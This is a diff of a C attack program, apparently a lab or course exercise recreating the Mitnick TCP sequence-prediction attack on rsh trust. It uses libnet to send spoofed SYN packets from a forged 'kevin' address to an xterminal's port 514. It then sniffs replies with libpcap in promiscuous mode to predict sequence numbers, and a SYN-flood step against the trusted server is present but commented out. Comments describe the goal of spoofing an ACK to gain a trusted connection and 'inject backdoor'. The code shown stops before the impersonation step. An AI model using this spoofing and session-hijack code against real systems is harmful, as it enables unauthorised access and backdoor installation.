@@ -3,6 +3,7 @@
 #include <stdlib.h>
 //#include <common.h>
 #include <unistd.h>
+#include <pcap.h>
 
 
 //eth level data -> do I need this??
@@ -13,7 +14,7 @@
 //ip level data
 char * KEVIN_IP = "172.16.16.2";
 char * SERVER_IP = "172.16.16.3";
-#define XTERMINAL_IP "172.16.16.4"
+char * XTERMINAL_IP = "172.16.16.4";
 
 //tcp level data
 #define PORT 513
@@ -42,6 +43,8 @@ int main (void)
 	//ip conversion
 	u_long server_ip = libnet_name2addr4(l, SERVER_IP, LIBNET_DONT_RESOLVE);
 	u_long kevin_ip = libnet_name2addr4(l, KEVIN_IP, LIBNET_DONT_RESOLVE);
+	u_long xterm_ip = libnet_name2addr4(l, XTERMINAL_IP, LIBNET_DONT_RESOLVE);
+
 
 	if (server_ip == (u_long) -1)
 	{
@@ -53,6 +56,11 @@ int main (void)
 		printf("error in kevin ip conversion\n");
 		exit(EXIT_FAILURE);
 	}
+	if (xterm_ip == (u_long) -1)
+	{
+		printf("error in xterm ip conversion\n");
+		exit(EXIT_FAILURE);
+	}
 
 	//dos the server
 	char disable[] = "disable";
@@ -62,18 +70,74 @@ int main (void)
 	{
 		//craft and send 10 packets with "disable" payload
 		printf("dos\n");
-		send_syn(513, (uint8_t *) disable, (u_short) strlen(disable), l, server_ip, kevin_ip);
+		//send_syn(513, (uint8_t *) disable, (u_short) strlen(disable), l, server_ip, kevin_ip);
 	}
-	//now the server will ignore syn acks, that's exactly what I need because
-
-	//I will send spoofed syn
-	//The xterminal will send real synack to the server
-	//I will respond with spoofed ack cause I know the server seq num
-	//will have a trusted connection on the xterminal
+	//now the server will ignore syn acks, that's exactly what I need because my plan is:
+		//send spoofed syn, the xterminal will send real synack to the server
+		//I will respond with spoofed ack cause I know the server seq num (probing)
+		//will have a trusted connection on the xterminal and can inject backdoor
 
 	//contact xterminal to figure out next seq #
 
+	//libpcap setup
+	pcap_t *handle;			/* Session handle */
+	char *dev;			/* The device to sniff on */
+	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
+	struct bpf_program fp;		/* The compiled filter */
+	char filter_exp[] = "port 514";	/* The filter expression */
+	bpf_u_int32 mask;		/* Our netmask */
+	bpf_u_int32 net;		/* Our IP */
+	struct pcap_pkthdr header;	/* The header that pcap gives us */
+	const u_char *packet;		/* The actual packet */
 
+	/* Define the device */
+	dev = pcap_lookupdev(errbuf);
+	if (dev == NULL)
+	{
+		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
+		return(2);
+	}
+	/* Find the properties for the device */
+	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1)
+	{
+		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
+		net = 0;
+		mask = 0;
+	}
+	/* Open the session in promiscuous mode */
+	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+	if (handle == NULL)
+	{
+		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
+		return(2);
+	}
+	/* Compile and apply the filter */
+	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1)
+	{
+		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
+		return(2);
+	}
+	if (pcap_setfilter(handle, &fp) == -1)
+	{
+			fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
+			return(2);
+	}
+
+	//probe xterminal
+	int i;
+	printf("Starting probing\n");
+	for (i = 0; i < 5; i++)
+	{
+		//send syn packets to shell in xterm, with kevin ip, to read the real synack and compute next sequence number
+		printf("probe\n");
+		send_syn(514, NULL, 0, l, xterm_ip, kevin_ip);
+		/* Grab a packet */
+		packet = pcap_next(handle, &header);
+		/* Print its length */
+		printf("Jacked a packet with length of [%d]\n", header.len);
+	}
+
+	pcap_close(handle);
 	//impersonate trusted server
 
 
